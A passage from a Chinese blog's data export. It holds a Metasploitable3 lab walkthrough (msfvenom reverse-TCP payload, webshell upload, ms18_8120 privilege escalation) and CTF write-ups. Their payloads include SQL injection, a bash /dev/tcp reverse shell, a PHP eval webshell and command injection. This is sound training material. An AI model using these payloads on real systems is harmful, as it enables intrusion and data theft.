Connection\n</span>  --  ----  ----                     -----------                          ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3  192.168.1.70:13579 -&gt; 192.168.1.66:49816 (192.168.1.66)</code></pre></p>\n<p>background是返回msf控制台，getshell之后得到的shell是local server的权限，我们上传一个另外一个payload上去get更高权限的shell<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# msfvenom -p windows/meterpreter_reverse_tcp <span class=\"hljs-attribute\">Lhost</span>=192.168.1.70 <span class=\"hljs-attribute\">lport</span>=13789 -f exe &gt; 13789.exe\n[-] <span class=\"hljs-literal\">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class=\"hljs-keyword\">from</span> the payload\n[-] <span class=\"hljs-literal\">No</span> arch selected, selecting arch: x86 <span class=\"hljs-keyword\">from</span> the payload\n<span class=\"hljs-literal\">No</span> encoder <span class=\"hljs-keyword\">or</span> badchars specified, outputting<span class=\"hljs-built_in\"> raw </span>payload\nPayload size: 179779 bytes\nFinal size of exe file: 254976 bytes</code></pre></p>\n<p>上传<br><pre><code class=\"hljs undefined\">root@kali:~/Desktop# davtest -url http://192.168.1.66:8585/uploads/ -uploadfile 13789.exe -uploadloc 13789.exe\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n Testing DAV connection\nOPEN\t\tSUCCEED:\t\thttp://192.168.1.66:8585/uploads\n<span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span><span class=\"hljs-strong\">*****</span>*\n unless  Uploading file\nUpload succeeded: http://192.168.1.66:8585/uploads/13789.exe</code></pre></p>\n<p>msf开启监听,<code>sessions -i 1</code>选择id为1的session，<code>getwd</code>获取当前绝对路径，<code>execute -f</code>执行文件<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">set</span> payload windows/meterpreter_reverse_tcp \npayload =&gt; windows/meterpreter_reverse_tcp\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">show</span> options \nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">set</span> lport <span class=\"hljs-number\">13789</span>\nlport =&gt; <span class=\"hljs-number\">13789</span>\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; exploit -j -z\n\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; sessions -i <span class=\"hljs-number\">1</span>\n[*] Exploit running <span class=\"hljs-keyword\">as</span> background job <span class=\"hljs-number\">1.</span>\n[*] Exploit completed, but <span class=\"hljs-keyword\">no</span> <span class=\"hljs-keyword\">session</span> was created.\n\n[*] Started <span class=\"hljs-keyword\">reverse</span> TCP <span class=\"hljs-keyword\">handler</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">13789</span> \n\nmsf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; sessions -i <span class=\"hljs-number\">1</span>\n[*] <span class=\"hljs-keyword\">Starting</span> interaction <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1.</span>..\n\nmeterpreter &gt; getwd\nC:\\wamp\\www\\uploads\nmeterpreter &gt; <span class=\"hljs-keyword\">execute</span> -f <span class=\"hljs-string\">\"C:\\\\wamp\\\\www\\\\uploads\\\\13789.exe\"</span>\nProcess <span class=\"hljs-number\">1372</span> created.\nmeterpreter &gt; [*] Meterpreter <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">3</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">13789</span> -&gt; <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>:<span class=\"hljs-number\">50670</span>) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2019</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-22</span> <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">39</span> <span class=\"hljs-number\">-0500</span></code></pre></p>\n<p>我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限<br><pre><code class=\"hljs undefined\">msf5 exploit(multi/handler) &gt; sessions \nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                                  <span class=\"hljs-built_in\"> Connection\n</span>  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL<span class=\"hljs-built_in\"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)</code></pre></p>\n<p>接下来用ms18_8120提权</p>\n<pre><code class=\"hljs undefined\">msf5 exploit(multi/<span class=\"hljs-keyword\">handler</span>) &gt; <span class=\"hljs-keyword\">use</span> exploit/windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc \nmsf5 exploit(windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc) &gt; <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-keyword\">session</span> =&gt; <span class=\"hljs-number\">3</span>\n\nmsf5 exploit(windows/<span class=\"hljs-keyword\">local</span>/ms18_8120_win32k_privesc) &gt; exploit \n\n[*] Started <span class=\"hljs-keyword\">reverse</span> TCP <span class=\"hljs-keyword\">handler</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">4444</span> \n[*] Sending stage (<span class=\"hljs-number\">179779</span> <span class=\"hljs-keyword\">bytes</span>) <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>\n[+] Exploit finished, <span class=\"hljs-keyword\">wait</span> <span class=\"hljs-keyword\">for</span> privileged payload execution <span class=\"hljs-keyword\">to</span> complete.\n[*] Meterpreter <span class=\"hljs-keyword\">session</span> <span class=\"hljs-number\">4</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.70</span>:<span class=\"hljs-number\">4444</span> -&gt; <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.66</span>:<span class=\"hljs-number\">50799</span>) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2019</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-22</span> <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">04</span> <span class=\"hljs-number\">-0500</span>\n\nmeterpreter &gt;</code></pre>\n<p>查看sessions就可以看到普通用户权限变成了system权限<br><pre><code class=\"hljs undefined\">msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name <span class=\"hljs-built_in\"> Type </span>                    Information                                  <span class=\"hljs-built_in\"> Connection\n</span>  --  ----  ----                     -----------                                   ----------\n  1         meterpreter php/windows  LOCAL<span class=\"hljs-built_in\"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)\n  2         meterpreter x86/windows  NT AUTHORITY\\LOCAL<span class=\"hljs-built_in\"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)\n  3         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ METASPLOITABLE3         192.168.1.70:4444 -&gt; 192.168.1.66:62289 (192.168.1.66)</code></pre></p>\n<p>到此，复现完毕</p>"},{"title":"丁牛CTF做题记录","index_img":"/img/2019-04-19/index.jpg","date":"2019-04-19T06:15:16.000Z","_content":"都是些旧题，加深印象。\n<!--more-->\n\n### W2-web1\n这个是bugku上的login2，在响应头可以看到tip\n![2](/img/2019-04-19/2.png)\n解码出来是\n```php\n$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";\nif (!empty($row) && $row['password']===md5($password)){\n}\n```\n构造payload\n```\nusername=1' union select md5(1),md5(1)#&password=1\n```\n即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可\n![3](/img/2019-04-19/3.png)\n主机执行\n```bash\nnc -lvvp port\n```\n然后执行\n```bash\n|bash -i >& /dev/tcp/ip/port 0>&1\n```\nflag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}\n### W2-web2\n首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是`<!--?php`和`?-->`被过滤了\n![4](/img/2019-04-19/4.png)\npayload如下\n```php\n<script language=\"PHP\">\n@eval($_POST['a']);\n</script>\n```\n然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}\n### W2-web3\n```php\ninclude(\"flag.php\");\nif (isset($_GET['a'])) { \n if (strcmp($_GET['a'], $flag) == 0) \n die('Flag: '.$flag); \n else \nprint 'close to flag';}\nelse{\n show_source(__FILE__);\n}\n?>\n```\nstrcmp的问题，看这里–>[传送门](http://www.am0s.com/ctf/128.html),payload如下\n```\na[]=1\n```\nflag:CTF{php_trcmp_problems}\n### W2-web4\n```php\nshow_source(__FILE__);\n$username= \"this_is_secret\"; \n$password= \"this_is_not_known_to_you\"; \ninclude(\"flag.php\");//here I changed those two \n$info = isset($_GET['info'])? $_GET['info']: \"\" ;\n$data_unserialize = unserialize($info);\nif ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){\n echo $flag;\n}else{\n echo \"username or password error!\";\n}\n?>\n```\n构造数组绕过\n```\nArray\n(\n [username] => 1\n [password] => 1\n)\n//序列化后的结果\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n```\nflag:CTF{this_is_flag}\n### W2-web5\n![5](/img/2019-04-19/5.png)\n在1秒后，3秒内正确提交20次即可\n```python\n#-*-coding:utf-8\nfrom selenium.webdriver import Chrome\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nimport time\ndriver=Chrome(executable_path=\"D:\\\\Python27\\\\chromedriver.exe\")\nlogin_url=\"http://39.98.216.116:32795/\"\ndriver.get(login_url)\nfor i in range(20):\n    print '<--test%d-->'%i\n    list1 = driver.find_elements_by_tag_name('div')\n    tmp = ''\n    for i in list1:\n        tmp += i.text\n    tmp = tmp[:-1]\n    print tmp\n    tmp = 'res = '+tmp\n    exec(tmp)\n    print res\n    list2 = driver.find_elements_by_tag_name(\"input\")\n    list2[0].send_keys(res)\n    time.sleep(1)\n    list2[1].click()\n```\nflag:ctf{gr3At_cAcu1a7or}\n### W3-web1\n在响应头的hint可以看到index.php的源码\n![6](/img/2019-04-19/6.png)\n```php\n<?php\n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";\nini_set(\"display_error\", false); \nerror_reporting(0); \nif(!isset($_GET['number'])){\n   header(\"hint:source.txt\");\n   die(\"have a fun!!\"); \n}\nforeach([$_GET, $_POST] as $global_var) { \n    foreach($global_var as $key => $value) { \n        $value = trim($value); \n        is_string($value) && $req[$key] = addslashes($value); \n    } \n} \nfunction is_palindrome_number($number) { \n    $number = strval($number); \n    $i = 0; \n    $j = strlen($number) - 1; \n    while($i < $j) { \n        if($number[$i] !== $number[$j]) { \n            return false; \n        } \n        $i++; \n        $j--; \n    } \n    return true; \n}\nif(is_numeric($_REQUEST['number'])){\n\n   $info=\"sorry, you cann't input a number!\";\n}elseif($req['number']!=strval(intval($req['number']))){\n     $info = \"number must be equal to it's integer!! \";  \n}else{\n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n     if($value1!=$value2){\n          $info=\"no, this is not a palindrome number!\";\n     }else{\n          \n          if(is_palindrome_number($req[\"number\"])){\n              $info = \"nice! {$value1} is a palindrome number!\"; \n          }else{\n             $info=$flag;\n          }\n     }\n}\necho $info;\n```\n拿到flag的条件是\n1. 不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。\n2. 不能是一个回文数（is_palindrome_number判断）。\n3. 该数的反转的整数值应该和它本身的整数值相等。\n目前已知的两种解法是\n1. 利用intval函数溢出绕过\n2. 用科学计数法构造0=0\n用第二种方法构造的payload如下\n```\nnumber=0e-0%00\n```\nflag:CTF{b72dd89e71108245fe21a4c1849ae668}\n参考–>[传送门](http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/)\n\n### W3-web2\n```php\ninclude \"flag.php\";\nerror_reporting(0);\nshow_source(__FILE__);\n\n$a = @$_REQUEST['hello'];\neval(\"var_dump($a);\");\n```\nphp注入，payload如下\n```\n);echo%20`cat%20./flag.php`;//\n```\nflag:flag{92853051ab894a64f7865cf3c2128b34}\n### W3-web5\n![7](/img/2019-04-19/7.png)\n这道题是bugku上的一道注入题，没有过滤，payload如下\n```\nid=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()#\nid=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 'fl4g'#\nid=-1' union select 1,2,3,(select * from fl4g)#\n```\n![15](/img/2019-04-19/15.png)\nflag:CTF{Sql_INJECT0N_4813drd8hz4}\n\n### W3-web3\n查看源代码可以看到页面设置了`<html lang=\"en\">`，可能存在宽字节注入\n![8](/img/2019-04-19/8.png)\n登录框过滤了`空格`，`=`，`and`，但是`or`，`<`,`>`,`'`,`select`都没有过滤，同时用户名正确时只会显示password error\n构造测试payload\n```\nusername=admin%df%27or'1'>'1&password=1\nusername=admin%df%27or'2'>'1&password=1\n```\n再替换位置\n```\nusername=admin%df%27or(select(password))>'0&password=1\n```\n不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag\n![9](/img/2019-04-19/9.png)\nflag：CTF{b1iNd_SQL_iNJEcti0n!}\n\n### W3-web\n![10](/img/2019-04-19/10.png)\ncbc字节翻转攻击，首先扫描得到源码的备份文件`.index.php.swp`\n```php\n     $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n```\nadmin被禁止登录，但是我们可以利用反序列化漏洞重置`$_SESSION['username']为admin`\ncbc翻转攻击具体可以看师兄的博客–>[传送门](https://delcoding.github.io/2018/03/bugku-writeup4/)\nflag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}\n\n### W3-misc3\n下载回来的pdf是经过加密的，加密方法是rot13\n解密方法\n```bash\ncat MinionQuest.pdf | tr 'A-Za-z' 'N-ZA-Mn-za-m' > out.pdf\n```\n![11](/img/2019-04-19/11.png)\n解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片\n```bash\npdfimages -png result.pdf images\n```\n得到完整的图片\n![12](/img/2019-04-19/12.png)\nflag:BITSCTF{save_the_kid}\n参考–>[传送门](https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/)\n### W3-misc1\n\n下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片\n![13](/img/2019-04-19/13.png)\ndump出来就可以得到flag，微软照片的bug导致我卡了n个小时，**上面sublime，下面微软的照片**\n![14](/img/2019-04-19/14.png)\n### W3-misc5\n\n参考–>[传送门](https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF)\n\n","source":"_posts/2019-04-19-digapis-ctf-wp.md","raw":"---\ntitle: 丁牛CTF做题记录\nindex_img: /img/2019-04-19/index.jpg\ndate: 2019-04-19 14:15:16\ntags: \n- writeup\n- misc\n- web\n- ctf\n---\n都是些旧题，加深印象。\n<!--more-->\n\n### W2-web1\n这个是bugku上的login2，在响应头可以看到tip\n![2](/img/2019-04-19/2.png)\n解码出来是\n```php\n$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";\nif (!empty($row) && $row['password']===md5($password)){\n}\n```\n构造payload\n```\nusername=1' union select md5(1),md5(1)#&password=1\n```\n即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可\n![3](/img/2019-04-19/3.png)\n主机执行\n```bash\nnc -lvvp port\n```\n然后执行\n```bash\n|bash -i >& /dev/tcp/ip/port 0>&1\n```\nflag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}\n### W2-web2\n首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是`<!--?php`和`?-->`被过滤了\n![4](/img/2019-04-19/4.png)\npayload如下\n```php\n<script language=\"PHP\">\n@eval($_POST['a']);\n</script>\n```\n然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}\n### W2-web3\n```php\ninclude(\"flag.php\");\nif (isset($_GET['a'])) { \n if (strcmp($_GET['a'], $flag) == 0) \n die('Flag: '.$flag); \n else \nprint 'close to flag';}\nelse{\n show_source(__FILE__);\n}\n?>\n```\nstrcmp的问题，看这里–>[传送门](http://www.am0s.com/ctf/128.html),payload如下\n```\na[]=1\n```\nflag:CTF{php_trcmp_problems}\n### W2-web4\n```php\nshow_source(__FILE__);\n$username= \"this_is_secret\"; \n$password= \"this_is_not_known_to_you\"; \ninclude(\"flag.php\");//here I changed those two \n$info = isset($_GET['info'])? $_GET['info']: \"\" ;\n$data_unserialize = unserialize($info);\nif ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){\n echo $flag;\n}else{\n echo \"username or password error!\";\n}\n?>\n```\n构造数组绕过\n```\nArray\n(\n [username] => 1\n [password] => 1\n)\n//序列化后的结果\na:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n```\nflag:CTF{this_is_flag}\n### W2-web5\n![5](/img/2019-04-19/5.png)\n在1秒后，3秒内正确提交20次即可\n```python\n#-*-coding:utf-8\nfrom selenium.webdriver import Chrome\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nimport time\ndriver=Chrome(executable_path=\"D:\\\\Python27\\\\chromedriver.exe\")\nlogin_url=\"http://39.98.216.116:32795/\"\ndriver.get(login_url)\nfor i in range(20):\n    print '<--test%d-->'%i\n    list1 = driver.find_elements_by_tag_name('div')\n    tmp = ''\n    for i in list1:\n        tmp += i.text\n    tmp = tmp[:-1]\n    print tmp\n    tmp = 'res = '+tmp\n    exec(tmp)\n    print res\n    list2 = driver.find_elements_by_tag_name(\"input\")\n    list2[0].send_keys(res)\n    time.sleep(1)\n    list2[1].click()\n```\nflag:ctf{gr3At_cAcu1a7or}\n### W3-web1\n在响应头的hint可以看到index.php的源码\n![6](/img/2019-04-19/6.png)\n```php\n<?php\n$info = \"\"; \n$req = [];\n$flag=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";\nini_set(\"display_error\", false); \nerror_reporting(0); \nif(!isset($_GET['number'])){\n   header(\"hint:source.txt\");\n   die(\"have a fun!!\"); \n}\nforeach([$_GET, $_POST] as $global_var) { \n    foreach($global_var as $key => $value) { \n        $value = trim($value); \n        is_string($value) && $req[$key] = addslashes($value); \n    } \n} \nfunction is_palindrome_number($number) { \n    $number = strval($number); \n    $i = 0; \n    $j = strlen($number) - 1; \n    while($i < $j) { \n        if($number[$i] !== $number[$j]) { \n            return false; \n        } \n        $i++; \n        $j--; \n    } \n    return true; \n}\nif(is_numeric($_REQUEST['number'])){\n\n   $info=\"sorry, you cann't input a number!\";\n}elseif($req['number']!=strval(intval($req['number']))){\n     $info = \"number must be equal to it's integer!! \";  \n}else{\n     $value1 = intval($req[\"number\"]);\n     $value2 = intval(strrev($req[\"number\"]));  \n     if($value1!=$value2){\n          $info=\"no, this is not a palindrome number!\";\n     }else{\n          \n          if(is_palindrome_number($req[\"number\"])){\n              $info = \"nice! {$value1} is a palindrome number!\"; \n          }else{\n             $info=$flag;\n          }\n     }\n}\necho $info;\n```\n拿到flag的条件是\n1. 不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。\n2. 不能是一个回文数（is_palindrome_number判断）。\n3. 该数的反转的整数值应该和它本身的整数值相等。\n目前已知的两种解法是\n1. 利用intval函数溢出绕过\n2. 用科学计数法构造0=0\n用第二种方法构造的payload如下\n```\nnumber=0e-0%00\n```\nflag:CTF{b72dd89e71108245fe21a4c1849ae668}\n参考–>[传送门](http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/)\n\n### W3-web2\n```php\ninclude \"flag.php\";\nerror_reporting(0);\nshow_source(__FILE__);\n\n$a = @$_REQUEST['hello'];\neval(\"var_dump($a);\");\n```\nphp注入，payload如下\n```\n);echo%20`cat%20./flag.php`;//\n```\nflag:flag{92853051ab894a64f7865cf3c2128b34}\n### W3-web5\n![7](/img/2019-04-19/7.png)\n这道题是bugku上的一道注入题，没有过滤，payload如下\n```\nid=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()#\nid=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 'fl4g'#\nid=-1' union select 1,2,3,(select * from fl4g)#\n```\n![15](/img/2019-04-19/15.png)\nflag:CTF{Sql_INJECT0N_4813drd8hz4}\n\n### W3-web3\n查看源代码可以看到页面设置了`<html lang=\"en\">`，可能存在宽字节注入\n![8](/img/2019-04-19/8.png)\n登录框过滤了`空格`，`=`，`and`，但是`or`，`<`,`>`,`'`,`select`都没有过滤，同时用户名正确时只会显示password error\n构造测试payload\n```\nusername=admin%df%27or'1'>'1&password=1\nusername=admin%df%27or'2'>'1&password=1\n```\n再替换位置\n```\nusername=admin%df%27or(select(password))>'0&password=1\n```\n不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag\n![9](/img/2019-04-19/9.png)\nflag：CTF{b1iNd_SQL_iNJEcti0n!}\n\n### W3-web\n![10](/img/2019-04-19/10.png)\ncbc字节翻转攻击，首先扫描得到源码的备份文件`.index.php.swp`\n```php\n     $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\n```\nadmin被禁止登录，但是我们可以利用反序列化漏洞重置`$_SESSION['username']为admin`\ncbc翻转攻击具体可以看师兄的博客–>[传送门](https://delcoding.github.io/2018/03/bugku-writeup4/)\nflag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}\n\n### W3-misc3\n下载回来的pdf是经过加密的，加密方法是rot13\n解密方法\n```bash\ncat MinionQuest.pdf | tr 'A-Za-z' 'N-ZA-Mn-za-m' > out.pdf\n```\n![11](/img/2019-04-19/11.png)\n解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片\n```bash\npdfimages -png result.pdf images\n```\n得到完整的图片\n![12](/img/2019-04-19/12.png)\nflag:BITSCTF{save_the_kid}\n参考–>[传送门](https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/)\n### W3-misc1\n\n下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片\n![13](/img/2019-04-19/13.png)\ndump出来就可以得到flag，微软照片的bug导致我卡了n个小时，**上面sublime，下面微软的照片**\n![14](/img/2019-04-19/14.png)\n### W3-misc5\n\n参考–>[传送门](https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF)\n\n","slug":"digapis-ctf-wp","published":1,"mouth":"04","updated":"2020-09-17T11:28:52.488Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxj000oez8kib1grmh7","content":"<p>都是些旧题，加深印象。<br><a id=\"more\"></a></p>\n<h3 id=\"W2-web1\"><a href=\"#W2-web1\" class=\"headerlink\" title=\"W2-web1\"></a>W2-web1</h3><p>这个是bugku上的login2，在响应头可以看到tip<br><img src=\"/img/2019-04-19/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>解码出来是<br><pre><code class=\"hljs php\">$sql=<span class=\"hljs-string\">\"SELECT username,password FROM admin WHERE username='\"</span>.$username.<span class=\"hljs-string\">\"'\"</span>;\n<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>($row) &amp;&amp; $row[<span class=\"hljs-string\">'password'</span>]===md5($password))&#123;\n&#125;</code></pre></p>\n<p>构造payload<br><pre><code class=\"hljs undefined\">username=<span class=\"hljs-number\">1</span>' union select md5(<span class=\"hljs-number\">1</span>),md5(<span class=\"hljs-number\">1</span>)#&amp;password=<span class=\"hljs-number\">1</span></code></pre></p>\n<p>即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可<br><img src=\"/img/2019-04-19/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>主机执行<br><pre><code class=\"hljs bash\">nc -lvvp port</code></pre></p>\n<p>然后执行<br><pre><code class=\"hljs bash\">|bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre></p>\n<p>flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}</p>\n<h3 id=\"W2-web2\"><a href=\"#W2-web2\" class=\"headerlink\" 